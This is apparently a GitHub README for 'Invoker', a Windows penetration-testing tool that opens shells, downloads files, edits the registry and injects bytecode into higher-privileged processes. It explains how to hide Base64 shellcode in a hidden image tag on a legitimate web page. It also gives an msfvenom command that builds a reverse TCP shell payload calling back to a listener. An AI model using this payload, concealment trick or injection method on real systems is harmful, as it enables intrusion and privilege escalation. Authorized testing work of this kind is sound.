# Invoker

Penetration testing utility.

**The goal is to use this tool when access to some Windows OS features through GUI is restricted.**

Capabilities:

* invoke the Command Prompt and PowerShell,
* connect to a remote host,
* schedule a task,
* download a file,
* add a registry key,
* terminate a running process,
* inject bytecode into a running process.

Built with Dev-C++ IDE v5.11 (64 bit), compiled with TDM-GCC v4.9.2 (64 bit) and tested on Windows 10 Enterprise OS (64 bit). Download Dev-C++ from [here](https://sourceforge.net/projects/orwelldevcpp/files/Portable%20Releases/).

Made for educational purposes. I hope it will help!

## How to Run

Run ['\\exec\\Invoker.exe'](https://github.com/ivan-sincek/invoker/tree/master/exec).

## Bytecode Injection

Elevate privileges by injecting bytecode into a higher-privileged process.

This tool will parse any HTTP response received and look for the custom image element `<img class="bc" src="data:image/gif;base64,encoded" alt="bc" hidden="hidden">` where `encoded` is a binary code/file encoded in Base64.

With this you can hide your bytecode inside any legitimate web page in plain sight but you must strictly follow this format/rule.

You can also make your own custom element but don't forget to modify the existing HTTP response parsing inside the program source code and recompile it.

Check an example at [pastebin.com/raw/Nd1tCBv6](https://pastebin.com/raw/Nd1tCBv6).

**Bytecode provided will most certainly not work for you.**

Bytecode was generated on Kali Linux v2019.4 (64 bit) with the following MSFvenom command (modify it to your need):

```fundamental
msfvenom --platform windows -a x64 -e x64/xor -p windows/x64/shell_reverse_tcp LHOST=192.168.8.185 LPORT=9000 EXITFUNC=thread -f raw -b \x00\x0a\x0d\xff | base64 -w 0 > /root/Desktop/payload.txt
```

Bytecode might not work on the first try due to some other bad characters.

## PowerShell Scripts

Check all the PowerShell scripts used in the main C++ program [here](https://github.com/ivan-sincek/invoker/tree/master/ps).

## Images

![Invoker](https://github.com/ivan-sincek/invoker/blob/master/img/invoker.jpg)

![Injection](https://github.com/ivan-sincek/invoker/blob/master/img/injection.jpg)

![Process List](https://github.com/ivan-sincek/invoker/blob/master/img/process_list.jpg)

![Shell](https://github.com/ivan-sincek/invoker/blob/master/img/shell.jpg)
